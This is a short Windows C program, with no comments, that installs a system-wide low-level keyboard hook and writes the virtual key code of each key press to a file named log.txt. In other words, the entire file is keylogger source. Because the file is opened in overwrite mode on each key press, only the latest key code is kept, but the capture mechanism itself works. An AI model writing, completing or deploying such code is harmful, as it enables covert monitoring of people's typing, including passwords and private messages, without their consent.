#include <stdio.h>
#include <windows.h>

LRESULT CALLBACK pass(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
        
        if (wParam == WM_KEYDOWN) {
            DWORD vkCode = pKeyBoard->vkCode;

            FILE *f = fopen("log.txt","w");
            fprintf(f,":%lu",vkCode);
            fclose(f);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}


int main()
{
    HHOOK huk = SetWindowsHookEx
    (
    WH_KEYBOARD_LL,
    pass,
    GetModuleHandle(NULL),
    0
    );

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(huk);
    return 0;
}